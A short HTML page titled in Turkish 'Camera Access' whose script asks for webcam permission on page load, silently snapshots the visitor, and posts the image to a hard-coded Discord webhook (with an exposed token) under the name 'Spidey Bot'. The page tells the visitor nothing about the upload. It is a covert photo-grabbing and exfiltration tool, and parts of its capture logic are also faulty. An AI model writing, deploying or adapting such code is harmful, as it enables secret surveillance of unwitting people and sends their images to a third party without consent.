<!DOCTYPE html>
<html>
  <head>
    <title>Kamera Erişimi</title>
  </head>
  <body>
    <h1>Kamera Erişimi</h1>
    <div id="picture-container"></div>

    <script>
      const pictureContainer = document.getElementById('picture-container');
      const webhookUrl = 'https://discord.com/api/webhooks/1246133942344617984/L5BhAqPdku8Q8qR5-DJO5senhebGe2UMdVCsxEzb7cj_pYXBOsG43i1eZzPSk15KrHJD';
      const webhookUsername = 'Spidey Bot';
      const webhookAvatarUrl = 'https://discord.com/assets/ac6f8cf36394c66e7651.png';

      // Request permission for camera access when the page is loaded
      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
       .then(stream => {
          // Take a picture when permission is granted
          const video = document.createElement('video');
          video.srcObject = stream;
          video.play();

          // Take a snapshot of the video
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const imageData = canvas.toDataURL('image/jpeg', 0.9);

          // Send the image to the Discord webhook
          const formData = new FormData();
          formData.append('file', imageData, 'image.jpg');
          formData.append('username', webhookUsername);
          formData.append('avatar_url', webhookAvatarUrl);

          fetch(webhookUrl, {
            method: 'POST',
            body: formData,
          })
         .then(response => response.json())
         .then(data => console.log(data))
         .catch(error => console.error(error));

          // Stop the video stream
          stream.getTracks().forEach(track => track.stop());
        })
       .catch(error => console.error('Error:', error));
    </script>
  </body>
</html>
